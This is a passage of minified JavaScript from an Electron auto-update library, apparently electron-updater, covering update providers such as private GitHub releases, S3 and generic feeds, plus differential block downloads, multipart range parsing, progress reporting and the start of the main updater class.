    async getLatestVersion() {
      const o = new a.CancellationToken(),
        n = (0, f.getChannelFilename)(this.getDefaultChannelName()),
        s = await this.getLatestVersionInfo(o),
        u = s.assets.find((y) => y.name === n);
      if (u == null)
        throw (0, a.newError)(
          `Cannot find ${n} in the release ${s.html_url || s.name}`,
          "ERR_UPDATER_CHANNEL_FILE_NOT_FOUND"
        );
      const m = new h.URL(u.url);
      let E;
      try {
        E = (0, i.load)(
          await this.httpRequest(
            m,
            this.configureHeaders("application/octet-stream"),
            o
          )
        );
      } catch (y) {
        throw y instanceof a.HttpError && y.statusCode === 404
          ? (0, a.newError)(
            `Cannot find ${n} in the latest release artifacts (${m}): ${y.stack || y.message
            }`,
            "ERR_UPDATER_CHANNEL_FILE_NOT_FOUND"
          )
          : y;
      }
      return (E.assets = s.assets), E;
    }
    get fileExtraDownloadHeaders() {
      return this.configureHeaders("application/octet-stream");
    }
    configureHeaders(o) {
      return { accept: o, authorization: `token ${this.token}` };
    }
    async getLatestVersionInfo(o) {
      const n = this.updater.allowPrerelease;
      let s = this.basePath;
      n || (s = `${s}/latest`);
      const u = (0, f.newUrlFromBase)(s, this.baseUrl);
      try {
        const m = JSON.parse(
          await this.httpRequest(
            u,
            this.configureHeaders("application/vnd.github.v3+json"),
            o
          )
        );
        return n ? m.find((E) => E.prerelease) || m[0] : m;
      } catch (m) {
        throw (0, a.newError)(
          `Unable to find latest version on GitHub (${u}), please ensure a production release exists: ${m.stack || m.message
          }`,
          "ERR_UPDATER_LATEST_VERSION_NOT_FOUND"
        );
      }
    }
    get basePath() {
      return this.computeGithubBasePath(
        `/repos/${this.options.owner}/${this.options.repo}/releases`
      );
    }
    resolveFiles(o) {
      return (0, r.getFileList)(o).map((n) => {
        const s = c.posix.basename(n.url).replace(/ /g, "-"),
          u = o.assets.find((m) => m != null && m.name === s);
        if (u == null)
          throw (0, a.newError)(
            `Cannot find asset "${s}" in: ${JSON.stringify(o.assets, null, 2)}`,
            "ERR_UPDATER_ASSET_NOT_FOUND"
          );
        return { url: new h.URL(u.url), info: n };
      });
    }
  };
  return (sr.PrivateGitHubProvider = l), sr;
}
var Du;
function Ad() {
  if (Du) return ir;
  (Du = 1),
    Object.defineProperty(ir, "__esModule", { value: !0 }),
    (ir.isUrlProbablySupportMultiRangeRequests = r),
    (ir.createClient = l);
  const a = Be(),
    i = yd(),
    c = Xl(),
    h = Jl(),
    f = Ed(),
    t = _d();
  function r(e) {
    return !e.includes("s3.amazonaws.com");
  }
  function l(e, o, n) {
    if (typeof e == "string")
      throw (0, a.newError)(
        "Please pass PublishConfiguration object",
        "ERR_UPDATER_INVALID_PROVIDER_CONFIGURATION"
      );
    const s = e.provider;
    switch (s) {
      case "github": {
        const u = e,
          m =
            (u.private
              ? process.env.GH_TOKEN || process.env.GITHUB_TOKEN
              : null) || u.token;
        return m == null
          ? new h.GitHubProvider(u, o, n)
          : new t.PrivateGitHubProvider(u, o, m, n);
      }
      case "bitbucket":
        return new i.BitbucketProvider(e, o, n);
      case "keygen":
        return new f.KeygenProvider(e, o, n);
      case "s3":
      case "spaces":
        return new c.GenericProvider(
          {
            provider: "generic",
            url: (0, a.getS3LikeProviderBaseUrl)(e),
            channel: e.channel || null,
          },
          o,
          { ...n, isUseMultipleRangeRequest: !1 }
        );
      case "generic": {
        const u = e;
        return new c.GenericProvider(u, o, {
          ...n,
          isUseMultipleRangeRequest:
            u.useMultipleRangeRequest !== !1 && r(u.url),
        });
      }
      case "custom": {
        const u = e,
          m = u.updateProvider;
        if (!m)
          throw (0, a.newError)(
            "Custom provider not specified",
            "ERR_UPDATER_INVALID_PROVIDER_CONFIGURATION"
          );
        return new m(u, o, n);
      }
      default:
        throw (0, a.newError)(
          `Unsupported provider: ${s}`,
          "ERR_UPDATER_UNSUPPORTED_PROVIDER"
        );
    }
  }
  return ir;
}
var ur = {},
  lr = {},
  Bt = {},
  jt = {},
  xu;
function qo() {
  if (xu) return jt;
  (xu = 1),
    Object.defineProperty(jt, "__esModule", { value: !0 }),
    (jt.OperationKind = void 0),
    (jt.computeOperations = i);
  var a;
  (function (r) {
    (r[(r.COPY = 0)] = "COPY"), (r[(r.DOWNLOAD = 1)] = "DOWNLOAD");
  })(a || (jt.OperationKind = a = {}));
  function i(r, l, e) {
    const o = t(r.files),
      n = t(l.files);
    let s = null;
    const u = l.files[0],
      m = [],
      E = u.name,
      y = o.get(E);
    if (y == null) throw new Error(`no file ${E} in old blockmap`);
    const p = n.get(E);
    let A = 0;
    const { checksumToOffset: S, checksumToOldSize: b } = f(
      o.get(E),
      y.offset,
      e
    );
    let R = u.offset;
    for (let C = 0; C < p.checksums.length; R += p.sizes[C], C++) {
      const v = p.sizes[C],
        w = p.checksums[C];
      let _ = S.get(w);
      _ != null &&
        b.get(w) !== v &&
        (e.warn(
          `Checksum ("${w}") matches, but size differs (old: ${b.get(
            w
          )}, new: ${v})`
        ),
          (_ = void 0)),
        _ === void 0
          ? (A++,
            s != null && s.kind === a.DOWNLOAD && s.end === R
              ? (s.end += v)
              : ((s = { kind: a.DOWNLOAD, start: R, end: R + v }),
                h(s, m, w, C)))
          : s != null && s.kind === a.COPY && s.end === _
            ? (s.end += v)
            : ((s = { kind: a.COPY, start: _, end: _ + v }), h(s, m, w, C));
    }
    return (
      A > 0 &&
      e.info(
        `File${u.name === "file" ? "" : " " + u.name} has ${A} changed blocks`
      ),
      m
    );
  }
  const c =
    process.env.DIFFERENTIAL_DOWNLOAD_PLAN_BUILDER_VALIDATE_RANGES === "true";
  function h(r, l, e, o) {
    if (c && l.length !== 0) {
      const n = l[l.length - 1];
      if (n.kind === r.kind && r.start < n.end && r.start > n.start) {
        const s = [n.start, n.end, r.start, r.end].reduce((u, m) =>
          u < m ? u : m
        );
        throw new Error(`operation (block index: ${o}, checksum: ${e}, kind: ${a[r.kind]
          }) overlaps previous operation (checksum: ${e}):
abs: ${n.start} until ${n.end} and ${r.start} until ${r.end}
rel: ${n.start - s} until ${n.end - s} and ${r.start - s} until ${r.end - s}`);
      }
    }
    l.push(r);
  }
  function f(r, l, e) {
    const o = new Map(),
      n = new Map();
    let s = l;
    for (let u = 0; u < r.checksums.length; u++) {
      const m = r.checksums[u],
        E = r.sizes[u],
        y = n.get(m);
      if (y === void 0) o.set(m, s), n.set(m, E);
      else if (e.debug != null) {
        const p = y === E ? "(same size)" : `(size: ${y}, this size: ${E})`;
        e.debug(
          `${m} duplicated in blockmap ${p}, it doesn't lead to broken differential downloader, just corresponding block will be skipped)`
        );
      }
      s += E;
    }
    return { checksumToOffset: o, checksumToOldSize: n };
  }
  function t(r) {
    const l = new Map();
    for (const e of r) l.set(e.name, e);
    return l;
  }
  return jt;
}
var Nu;
function Ql() {
  if (Nu) return Bt;
  (Nu = 1),
    Object.defineProperty(Bt, "__esModule", { value: !0 }),
    (Bt.DataSplitter = void 0),
    (Bt.copyData = r);
  const a = Be(),
    i = be,
    c = Ht,
    h = qo(),
    f = Buffer.from(`\r
\r
`);
  var t;
  (function (e) {
    (e[(e.INIT = 0)] = "INIT"),
      (e[(e.HEADER = 1)] = "HEADER"),
      (e[(e.BODY = 2)] = "BODY");
  })(t || (t = {}));
  function r(e, o, n, s, u) {
    const m = (0, i.createReadStream)("", {
      fd: n,
      autoClose: !1,
      start: e.start,
      end: e.end - 1,
    });
    m.on("error", s), m.once("end", u), m.pipe(o, { end: !1 });
  }
  let l = class extends c.Writable {
    constructor(o, n, s, u, m, E) {
      super(),
        (this.out = o),
        (this.options = n),
        (this.partIndexToTaskIndex = s),
        (this.partIndexToLength = m),
        (this.finishHandler = E),
        (this.partIndex = -1),
        (this.headerListBuffer = null),
        (this.readState = t.INIT),
        (this.ignoreByteCount = 0),
        (this.remainingPartDataCount = 0),
        (this.actualPartLength = 0),
        (this.boundaryLength = u.length + 4),
        (this.ignoreByteCount = this.boundaryLength - 2);
    }
    get isFinished() {
      return this.partIndex === this.partIndexToLength.length;
    }
    _write(o, n, s) {
      if (this.isFinished) {
        console.error(`Trailing ignored data: ${o.length} bytes`);
        return;
      }
      this.handleData(o).then(s).catch(s);
    }
    async handleData(o) {
      let n = 0;
      if (this.ignoreByteCount !== 0 && this.remainingPartDataCount !== 0)
        throw (0, a.newError)(
          "Internal error",
          "ERR_DATA_SPLITTER_BYTE_COUNT_MISMATCH"
        );
      if (this.ignoreByteCount > 0) {
        const s = Math.min(this.ignoreByteCount, o.length);
        (this.ignoreByteCount -= s), (n = s);
      } else if (this.remainingPartDataCount > 0) {
        const s = Math.min(this.remainingPartDataCount, o.length);
        (this.remainingPartDataCount -= s),
          await this.processPartData(o, 0, s),
          (n = s);
      }
      if (n !== o.length) {
        if (this.readState === t.HEADER) {
          const s = this.searchHeaderListEnd(o, n);
          if (s === -1) return;
          (n = s), (this.readState = t.BODY), (this.headerListBuffer = null);
        }
        for (; ;) {
          if (this.readState === t.BODY) this.readState = t.INIT;
          else {
            this.partIndex++;
            let E = this.partIndexToTaskIndex.get(this.partIndex);
            if (E == null)
              if (this.isFinished) E = this.options.end;
              else
                throw (0, a.newError)(
                  "taskIndex is null",
                  "ERR_DATA_SPLITTER_TASK_INDEX_IS_NULL"
                );
            const y =
              this.partIndex === 0
                ? this.options.start
                : this.partIndexToTaskIndex.get(this.partIndex - 1) + 1;
            if (y < E) await this.copyExistingData(y, E);
            else if (y > E)
              throw (0, a.newError)(
                "prevTaskIndex must be < taskIndex",
                "ERR_DATA_SPLITTER_TASK_INDEX_ASSERT_FAILED"
              );
            if (this.isFinished) {
              this.onPartEnd(), this.finishHandler();
              return;
            }
            if (((n = this.searchHeaderListEnd(o, n)), n === -1)) {
              this.readState = t.HEADER;
              return;
            }
          }
          const s = this.partIndexToLength[this.partIndex],
            u = n + s,
            m = Math.min(u, o.length);
          if (
            (await this.processPartStarted(o, n, m),
              (this.remainingPartDataCount = s - (m - n)),
              this.remainingPartDataCount > 0)
          )
            return;
          if (((n = u + this.boundaryLength), n >= o.length)) {
            this.ignoreByteCount = this.boundaryLength - (o.length - u);
            return;
          }
        }
      }
    }
    copyExistingData(o, n) {
      return new Promise((s, u) => {
        const m = () => {
          if (o === n) {
            s();
            return;
          }
          const E = this.options.tasks[o];
          if (E.kind !== h.OperationKind.COPY) {
            u(new Error("Task kind must be COPY"));
            return;
          }
          r(E, this.out, this.options.oldFileFd, u, () => {
            o++, m();
          });
        };
        m();
      });
    }
    searchHeaderListEnd(o, n) {
      const s = o.indexOf(f, n);
      if (s !== -1) return s + f.length;
      const u = n === 0 ? o : o.slice(n);
      return (
        this.headerListBuffer == null
          ? (this.headerListBuffer = u)
          : (this.headerListBuffer = Buffer.concat([this.headerListBuffer, u])),
        -1
      );
    }
    onPartEnd() {
      const o = this.partIndexToLength[this.partIndex - 1];
      if (this.actualPartLength !== o)
        throw (0, a.newError)(
          `Expected length: ${o} differs from actual: ${this.actualPartLength}`,
          "ERR_DATA_SPLITTER_LENGTH_MISMATCH"
        );
      this.actualPartLength = 0;
    }
    processPartStarted(o, n, s) {
      return (
        this.partIndex !== 0 && this.onPartEnd(), this.processPartData(o, n, s)
      );
    }
    processPartData(o, n, s) {
      this.actualPartLength += s - n;
      const u = this.out;
      return u.write(n === 0 && o.length === s ? o : o.slice(n, s))
        ? Promise.resolve()
        : new Promise((m, E) => {
          u.on("error", E),
            u.once("drain", () => {
              u.removeListener("error", E), m();
            });
        });
    }
  };
  return (Bt.DataSplitter = l), Bt;
}
var cr = {},
  Fu;
function Sd() {
  if (Fu) return cr;
  (Fu = 1),
    Object.defineProperty(cr, "__esModule", { value: !0 }),
    (cr.executeTasksUsingMultipleRangeRequests = h),
    (cr.checkIsRangesSupported = t);
  const a = Be(),
    i = Ql(),
    c = qo();
  function h(r, l, e, o, n) {
    const s = (u) => {
      if (u >= l.length) {
        r.fileMetadataBuffer != null && e.write(r.fileMetadataBuffer), e.end();
        return;
      }
      const m = u + 1e3;
      f(
        r,
        { tasks: l, start: u, end: Math.min(l.length, m), oldFileFd: o },
        e,
        () => s(m),
        n
      );
    };
    return s;
  }
  function f(r, l, e, o, n) {
    let s = "bytes=",
      u = 0;
    const m = new Map(),
      E = [];
    for (let A = l.start; A < l.end; A++) {
      const S = l.tasks[A];
      S.kind === c.OperationKind.DOWNLOAD &&
        ((s += `${S.start}-${S.end - 1}, `),
          m.set(u, A),
          u++,
          E.push(S.end - S.start));
    }
    if (u <= 1) {
      const A = (S) => {
        if (S >= l.end) {
          o();
          return;
        }
        const b = l.tasks[S++];
        if (b.kind === c.OperationKind.COPY)
          (0, i.copyData)(b, e, l.oldFileFd, n, () => A(S));
        else {
          const R = r.createRequestOptions();
          R.headers.Range = `bytes=${b.start}-${b.end - 1}`;
          const C = r.httpExecutor.createRequest(R, (v) => {
            t(v, n) && (v.pipe(e, { end: !1 }), v.once("end", () => A(S)));
          });
          r.httpExecutor.addErrorAndTimeoutHandlers(C, n), C.end();
        }
      };
      A(l.start);
      return;
    }
    const y = r.createRequestOptions();
    y.headers.Range = s.substring(0, s.length - 2);
    const p = r.httpExecutor.createRequest(y, (A) => {
      if (!t(A, n)) return;
      const S = (0, a.safeGetHeader)(A, "content-type"),
        b = /^multipart\/.+?(?:; boundary=(?:(?:"(.+)")|(?:([^\s]+))))$/i.exec(
          S
        );
      if (b == null) {
        n(
          new Error(
            `Content-Type "multipart/byteranges" is expected, but got "${S}"`
          )
        );
        return;
      }
      const R = new i.DataSplitter(e, l, m, b[1] || b[2], E, o);
      R.on("error", n),
        A.pipe(R),
        A.on("end", () => {
          setTimeout(() => {
            p.abort(),
              n(new Error("Response ends without calling any handlers"));
          }, 1e4);
        });
    });
    r.httpExecutor.addErrorAndTimeoutHandlers(p, n), p.end();
  }
  function t(r, l) {
    if (r.statusCode >= 400) return l((0, a.createHttpError)(r)), !1;
    if (r.statusCode !== 206) {
      const e = (0, a.safeGetHeader)(r, "accept-ranges");
      if (e == null || e === "none")
        return (
          l(
            new Error(
              `Server doesn't support Accept-Ranges (response code ${r.statusCode})`
            )
          ),
          !1
        );
    }
    return !0;
  }
  return cr;
}
var fr = {},
  $u;
function Td() {
  if ($u) return fr;
  ($u = 1),
    Object.defineProperty(fr, "__esModule", { value: !0 }),
    (fr.ProgressDifferentialDownloadCallbackTransform = void 0);
  const a = Ht;
  var i;
  (function (h) {
    (h[(h.COPY = 0)] = "COPY"), (h[(h.DOWNLOAD = 1)] = "DOWNLOAD");
  })(i || (i = {}));
  let c = class extends a.Transform {
    constructor(f, t, r) {
      super(),
        (this.progressDifferentialDownloadInfo = f),
        (this.cancellationToken = t),
        (this.onProgress = r),
        (this.start = Date.now()),
        (this.transferred = 0),
        (this.delta = 0),
        (this.expectedBytes = 0),
        (this.index = 0),
        (this.operationType = i.COPY),
        (this.nextUpdate = this.start + 1e3);
    }
    _transform(f, t, r) {
      if (this.cancellationToken.cancelled) {
        r(new Error("cancelled"), null);
        return;
      }
      if (this.operationType == i.COPY) {
        r(null, f);
        return;
      }
      (this.transferred += f.length), (this.delta += f.length);
      const l = Date.now();
      l >= this.nextUpdate &&
        this.transferred !== this.expectedBytes &&
        this.transferred !== this.progressDifferentialDownloadInfo.grandTotal &&
        ((this.nextUpdate = l + 1e3),
          this.onProgress({
            total: this.progressDifferentialDownloadInfo.grandTotal,
            delta: this.delta,
            transferred: this.transferred,
            percent:
              (this.transferred /
                this.progressDifferentialDownloadInfo.grandTotal) *
              100,
            bytesPerSecond: Math.round(
              this.transferred / ((l - this.start) / 1e3)
            ),
          }),
          (this.delta = 0)),
        r(null, f);
    }
    beginFileCopy() {
      this.operationType = i.COPY;
    }
    beginRangeDownload() {
      (this.operationType = i.DOWNLOAD),
        (this.expectedBytes +=
          this.progressDifferentialDownloadInfo.expectedByteCounts[
          this.index++
          ]);
    }
    endRangeDownload() {
      this.transferred !== this.progressDifferentialDownloadInfo.grandTotal &&
        this.onProgress({
          total: this.progressDifferentialDownloadInfo.grandTotal,
          delta: this.delta,
          transferred: this.transferred,
          percent:
            (this.transferred /
              this.progressDifferentialDownloadInfo.grandTotal) *
            100,
          bytesPerSecond: Math.round(
            this.transferred / ((Date.now() - this.start) / 1e3)
          ),
        });
    }
    _flush(f) {
      if (this.cancellationToken.cancelled) {
        f(new Error("cancelled"));
        return;
      }
      this.onProgress({
        total: this.progressDifferentialDownloadInfo.grandTotal,
        delta: this.delta,
        transferred: this.transferred,
        percent: 100,
        bytesPerSecond: Math.round(
          this.transferred / ((Date.now() - this.start) / 1e3)
        ),
      }),
        (this.delta = 0),
        (this.transferred = 0),
        f(null);
    }
  };
  return (fr.ProgressDifferentialDownloadCallbackTransform = c), fr;
}
var Lu;
function Zl() {
  if (Lu) return lr;
  (Lu = 1),
    Object.defineProperty(lr, "__esModule", { value: !0 }),
    (lr.DifferentialDownloader = void 0);
  const a = Be(),
    i = Et(),
    c = be,
    h = Ql(),
    f = Gt,
    t = qo(),
    r = Sd(),
    l = Td();
  let e = class {
    constructor(u, m, E) {
      (this.blockAwareFileInfo = u),
        (this.httpExecutor = m),
        (this.options = E),
        (this.fileMetadataBuffer = null),
        (this.logger = E.logger);
    }
    createRequestOptions() {
      const u = { headers: { ...this.options.requestHeaders, accept: "*/*" } };
      return (
        (0, a.configureRequestUrl)(this.options.newUrl, u),
        (0, a.configureRequestOptions)(u),
        u
      );
    }
    doDownload(u, m) {
      if (u.version !== m.version)
        throw new Error(
          `version is different (${u.version} - ${m.version}), full download is required`
        );
      const E = this.logger,
        y = (0, t.computeOperations)(u, m, E);
      E.debug != null && E.debug(JSON.stringify(y, null, 2));
      let p = 0,
        A = 0;
      for (const b of y) {
        const R = b.end - b.start;
        b.kind === t.OperationKind.DOWNLOAD ? (p += R) : (A += R);
      }
      const S = this.blockAwareFileInfo.size;
      if (
        p +
        A +
        (this.fileMetadataBuffer == null
          ? 0
          : this.fileMetadataBuffer.length) !==
        S
      )
        throw new Error(
          `Internal error, size mismatch: downloadSize: ${p}, copySize: ${A}, newSize: ${S}`
        );
      return (
        E.info(
          `Full: ${o(S)}, To download: ${o(p)} (${Math.round(p / (S / 100))}%)`
        ),
        this.downloadFile(y)
      );
    }
    downloadFile(u) {
      const m = [],
        E = () =>
          Promise.all(
            m.map((y) =>
              (0, i.close)(y.descriptor).catch((p) => {
                this.logger.error(`cannot close file "${y.path}": ${p}`);
              })
            )
          );
      return this.doDownloadFile(u, m)
        .then(E)
        .catch((y) =>
          E()
            .catch((p) => {
              try {
                this.logger.error(`cannot close files: ${p}`);
              } catch (A) {
                try {
                  console.error(A);
                } catch { }
              }
              throw y;
            })
            .then(() => {
              throw y;
            })
        );
    }
    async doDownloadFile(u, m) {
      const E = await (0, i.open)(this.options.oldFile, "r");
      m.push({ descriptor: E, path: this.options.oldFile });
      const y = await (0, i.open)(this.options.newFile, "w");
      m.push({ descriptor: y, path: this.options.newFile });
      const p = (0, c.createWriteStream)(this.options.newFile, { fd: y });
      await new Promise((A, S) => {
        const b = [];
        let R;
        if (
          !this.options.isUseMultipleRangeRequest &&
          this.options.onProgress
        ) {
          const N = [];
          let L = 0;
          for (const $ of u)
            $.kind === t.OperationKind.DOWNLOAD &&
              (N.push($.end - $.start), (L += $.end - $.start));
          const F = { expectedByteCounts: N, grandTotal: L };
          (R = new l.ProgressDifferentialDownloadCallbackTransform(
            F,
            this.options.cancellationToken,
            this.options.onProgress
          )),
            b.push(R);
        }
        const C = new a.DigestTransform(this.blockAwareFileInfo.sha512);
        (C.isValidateOnEnd = !1),
          b.push(C),
          p.on("finish", () => {
            p.close(() => {
              m.splice(1, 1);
              try {
                C.validate();
              } catch (N) {
                S(N);
                return;
              }
              A(void 0);
            });
          }),
          b.push(p);
        let v = null;
        for (const N of b)
          N.on("error", S), v == null ? (v = N) : (v = v.pipe(N));
        const w = b[0];
        let _;
        if (this.options.isUseMultipleRangeRequest) {
          (_ = (0, r.executeTasksUsingMultipleRangeRequests)(this, u, w, E, S)),
            _(0);
          return;
        }
        let g = 0,
          D = null;
        this.logger.info(`Differential download: ${this.options.newUrl}`);
        const O = this.createRequestOptions();
        (O.redirect = "manual"),
          (_ = (N) => {
            var L, F;
            if (N >= u.length) {
              this.fileMetadataBuffer != null &&
                w.write(this.fileMetadataBuffer),
                w.end();
              return;
            }
            const $ = u[N++];
            if ($.kind === t.OperationKind.COPY) {
              R && R.beginFileCopy(), (0, h.copyData)($, w, E, S, () => _(N));
              return;
            }
            const k = `bytes=${$.start}-${$.end - 1}`;
            (O.headers.range = k),
              (F =
                (L = this.logger) === null || L === void 0
                  ? void 0
                  : L.debug) === null ||
              F === void 0 ||
              F.call(L, `download range: ${k}`),
              R && R.beginRangeDownload();
            const M = this.httpExecutor.createRequest(O, (K) => {
              K.on("error", S),
                K.on("aborted", () => {
                  S(new Error("response has been aborted by the server"));
                }),
                K.statusCode >= 400 && S((0, a.createHttpError)(K)),
                K.pipe(w, { end: !1 }),
                K.once("end", () => {
                  R && R.endRangeDownload(),
                    ++g === 100 ? ((g = 0), setTimeout(() => _(N), 1e3)) : _(N);
                });
            });
            M.on("redirect", (K, G, ne) => {
              this.logger.info(`Redirect to ${n(ne)}`),
                (D = ne),
                (0, a.configureRequestUrl)(new f.URL(D), O),
                M.followRedirect();
            }),
              this.httpExecutor.addErrorAndTimeoutHandlers(M, S),
              M.end();
          }),
          _(0);
      });
    }
    async readRemoteBytes(u, m) {
      const E = Buffer.allocUnsafe(m + 1 - u),
        y = this.createRequestOptions();
      y.headers.range = `bytes=${u}-${m}`;
      let p = 0;
      if (
        (await this.request(y, (A) => {
          A.copy(E, p), (p += A.length);
        }),
          p !== E.length)
      )
        throw new Error(
          `Received data length ${p} is not equal to expected ${E.length}`
        );
      return E;
    }
    request(u, m) {
      return new Promise((E, y) => {
        const p = this.httpExecutor.createRequest(u, (A) => {
          (0, r.checkIsRangesSupported)(A, y) &&
            (A.on("error", y),
              A.on("aborted", () => {
                y(new Error("response has been aborted by the server"));
              }),
              A.on("data", m),
              A.on("end", () => E()));
        });
        this.httpExecutor.addErrorAndTimeoutHandlers(p, y), p.end();
      });
    }
  };
  lr.DifferentialDownloader = e;
  function o(s, u = " KB") {
    return new Intl.NumberFormat("en").format((s / 1024).toFixed(2)) + u;
  }
  function n(s) {
    const u = s.indexOf("?");
    return u < 0 ? s : s.substring(0, u);
  }
  return lr;
}
var Uu;
function bd() {
  if (Uu) return ur;
  (Uu = 1),
    Object.defineProperty(ur, "__esModule", { value: !0 }),
    (ur.GenericDifferentialDownloader = void 0);
  const a = Zl();
  let i = class extends a.DifferentialDownloader {
    download(h, f) {
      return this.doDownload(h, f);
    }
  };
  return (ur.GenericDifferentialDownloader = i), ur;
}
var to = {},
  ku;
function Lt() {
  return (
    ku ||
    ((ku = 1),
      (function (a) {
        Object.defineProperty(a, "__esModule", { value: !0 }),
          (a.UpdaterSignal =
            a.UPDATE_DOWNLOADED =
            a.DOWNLOAD_PROGRESS =
            a.CancellationToken =
            void 0),
          (a.addHandler = h);
        const i = Be();
        Object.defineProperty(a, "CancellationToken", {
          enumerable: !0,
          get: function () {
            return i.CancellationToken;
          },
        }),
          (a.DOWNLOAD_PROGRESS = "download-progress"),
          (a.UPDATE_DOWNLOADED = "update-downloaded");
        class c {
          constructor(t) {
            this.emitter = t;
          }
          login(t) {
            h(this.emitter, "login", t);
          }
          progress(t) {
            h(this.emitter, a.DOWNLOAD_PROGRESS, t);
          }
          updateDownloaded(t) {
            h(this.emitter, a.UPDATE_DOWNLOADED, t);
          }
          updateCancelled(t) {
            h(this.emitter, "update-cancelled", t);
          }
        }
        a.UpdaterSignal = c;
        function h(f, t, r) {
          f.on(t, r);
        }
      })(to)),
    to
  );
}
var qu;
function Mo() {
  if (qu) return Ct;
  (qu = 1),
    Object.defineProperty(Ct, "__esModule", { value: !0 }),
    (Ct.NoOpLogger = Ct.AppUpdater = void 0);
  const a = Be(),
    i = _r,
    c = Ar,
    h = Ro,
    f = Et(),
    t = xo(),
    r = jf(),
    l = ye,
    e = Kl(),
    o = pd(),
    n = gd(),
    s = vd(),
    u = Xl(),
    m = Ad(),
    E = Tl,
    y = $t(),
    p = bd(),
    A = Lt();
  let S = class ec extends h.EventEmitter {
    get channel() {
      return this._channel;
    }
    set channel(v) {
      if (this._channel != null) {
        if (typeof v != "string")
          throw (0, a.newError)(
            `Channel must be a string, but got: ${v}`,
            "ERR_UPDATER_INVALID_CHANNEL"
          );
        if (v.length === 0)
          throw (0, a.newError)(
            "Channel must be not an empty string",
            "ERR_UPDATER_INVALID_CHANNEL"
          );
      }
      (this._channel = v), (this.allowDowngrade = !0);
    }
    addAuthHeader(v) {
      this.requestHeaders = Object.assign({}, this.requestHeaders, {
        authorization: v,
      });
    }
    get netSession() {
      return (0, s.getNetSession)();
    }
    get logger() {
      return this._logger;
    }
    set logger(v) {
      this._logger = v ?? new R();
    }
    set updateConfigPath(v) {
      (this.clientPromise = null),
        (this._appUpdateConfigPath = v),
        (this.configOnDisk = new r.Lazy(() => this.loadUpdateConfig()));
    }
    get isUpdateSupported() {
      return this._isUpdateSupported;
    }
    set isUpdateSupported(v) {
      v && (this._isUpdateSupported = v);
    }
    constructor(v, w) {
      super(),
        (this.autoDownload = !0),
        (this.autoInstallOnAppQuit = !0),
        (this.autoRunAppAfterInstall = !0),
        (this.allowPrerelease = !1),
        (this.fullChangelog = !1),
        (this.allowDowngrade = !1),
        (this.disableWebInstaller = !1),
        (this.disableDifferentialDownload = !1),
        (this.forceDevUpdateConfig = !1),
        (this._channel = null),
        (this.downloadedUpdateHelper = null),
        (this.requestHeaders = null),
        (this._logger = console),
        (this.signals = new A.UpdaterSignal(this)),
        (this._appUpdateConfigPath = null),
        (this._isUpdateSupported = (D) => this.checkIfUpdateSupported(D)),
        (this.clientPromise = null),
        (this.stagingUserIdPromise = new r.Lazy(() =>
          this.getOrCreateStagingUserId()
        )),
        (this.configOnDisk = new r.Lazy(() => this.loadUpdateConfig())),
        (this.checkForUpdatesPromise = null),
        (this.downloadPromise = null),
        (this.updateInfoAndProvider = null),
        (this._testOnlyOptions = null),
        this.on("error", (D) => {
          this._logger.error(`Error: ${D.stack || D.message}`);
        }),
        w == null
          ? ((this.app = new n.ElectronAppAdapter()),
            (this.httpExecutor = new s.ElectronHttpExecutor((D, O) =>
              this.emit("login", D, O)
            )))
          : ((this.app = w), (this.httpExecutor = null));
      const _ = this.app.version,
        g = (0, e.parse)(_);
      if (g == null)
        throw (0, a.newError)(
          `App version is not a valid semver version: "${_}"`,
          "ERR_UPDATER_INVALID_VERSION"
        );
      (this.currentVersion = g),
        (this.allowPrerelease = b(g)),
        v != null &&
        (this.setFeedURL(v),
          typeof v != "string" &&
          v.requestHeaders &&
          (this.requestHeaders = v.requestHeaders));
    }
    getFeedURL() {
      return "Deprecated. Do not use it.";
    }
    setFeedURL(v) {
      const w = this.createProviderRuntimeOptions();
      let _;
      typeof v == "string"
        ? (_ = new u.GenericProvider({ provider: "generic", url: v }, this, {
          ...w,
          isUseMultipleRangeRequest: (0,
            m.isUrlProbablySupportMultiRangeRequests)(v),
        }))
        : (_ = (0, m.createClient)(v, this, w)),
        (this.clientPromise = Promise.resolve(_));
    }
    checkForUpdates() {
      if (!this.isUpdaterActive()) return Promise.resolve(null);
      let v = this.checkForUpdatesPromise;
      if (v != null)
        return (
          this._logger.info("Checking for update (already in progress)"), v
        );
      const w = () => (this.checkForUpdatesPromise = null);
      return (
        this._logger.info("Checking for update"),
        (v = this.doCheckForUpdates()
          .then((_) => (w(), _))
          .catch((_) => {
            throw (
              (w(),
                this.emit(
                  "error",
                  _,
                  `Cannot check for updates: ${(_.stack || _).toString()}`
                ),
                _)
            );
          })),
        (this.checkForUpdatesPromise = v),
        v
      );
    }
    isUpdaterActive() {
      return this.app.isPackaged || this.forceDevUpdateConfig
        ? !0
        : (this._logger.info(
          "Skip checkForUpdates because application is not packed and dev update config is not forced"
        ),
          !1);
    }
    checkForUpdatesAndNotify(v) {
      return this.checkForUpdates().then((w) =>
        w?.downloadPromise
          ? (w.downloadPromise.then(() => {
            const _ = ec.formatDownloadNotification(
              w.updateInfo.version,
              this.app.name,
              v
            );
            new he.Notification(_).show();
          }),
            w)
          : (this._logger.debug != null &&
            this._logger.debug(
              "checkForUpdatesAndNotify called, downloadPromise is null"
            ),
            w)
      );
    }
    static formatDownloadNotification(v, w, _) {
      return (
        _ == null &&
        (_ = {
          title: "A new update is ready to install",
          body: "{appName} version {version} has been downloaded and will be automatically installed on exit",
        }),
        (_ = {
          title: _.title.replace("{appName}", w).replace("{version}", v),
          body: _.body.replace("{appName}", w).replace("{version}", v),
        }),
        _
      );
    }
    async isStagingMatch(v) {
      const w = v.stagingPercentage;
      let _ = w;
      if (_ == null) return !0;
      if (((_ = parseInt(_, 10)), isNaN(_)))
        return this._logger.warn(`Staging percentage is NaN: ${w}`), !0;
      _ = _ / 100;
      const g = await this.stagingUserIdPromise.value,
        O = a.UUID.parse(g).readUInt32BE(12) / 4294967295;
      return (
        this._logger.info(
          `Staging percentage: ${_}, percentage: ${O}, user id: ${g}`
        ),
        O < _
      );
    }
    computeFinalHeaders(v) {
      return (
        this.requestHeaders != null && Object.assign(v, this.requestHeaders), v
      );
    }
    async isUpdateAvailable(v) {
      const w = (0, e.parse)(v.version);
      if (w == null)
        throw (0, a.newError)(
          `This file could not be downloaded, or the latest version (from update server) does not have a valid semver version: "${v.version}"`,
          "ERR_UPDATER_INVALID_VERSION"
        );
      const _ = this.currentVersion;
      if (
        (0, e.eq)(w, _) ||
        !(await Promise.resolve(this.isUpdateSupported(v))) ||
        !(await this.isStagingMatch(v))
      )
        return !1;
      const D = (0, e.gt)(w, _),
        O = (0, e.lt)(w, _);
      return D ? !0 : this.allowDowngrade && O;
    }
